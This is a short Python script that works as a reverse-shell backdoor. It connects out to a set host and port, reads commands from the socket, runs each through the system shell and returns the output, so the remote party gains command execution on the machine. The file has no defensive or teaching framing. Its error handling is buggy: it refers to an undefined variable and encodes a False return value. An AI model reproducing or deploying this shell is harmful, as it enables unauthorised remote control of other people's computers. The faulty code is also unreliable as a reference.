import socket
import subprocess
import platform
import os
import random
import string
import sys



target_host="0.0.0.0"
target_port=9999


def run_command(command: str):
    try:
        command= command.rstrip()
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return str(output)
    except Exception as error:
        print(f'ERROR RUNNING COMMAND: {str(output)}')
        return False
    

def main():
    try:
        client = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
        client.connect( (target_host, target_port) )
        print('connected')
        while True:
            command = client.recv(4096)
            command = ( command.decode('utf-8') ).rstrip()

            if len(command) ==0:break
            else:
                output= run_command( command)
                output = output.encode('utf-8')
                client.send( output)

            

    except Exception as error:
        print( f'ERROR: {str(error)}')
    finally:
        client.close()
        sys.exit(1)


if __name__=='__main__':
    main()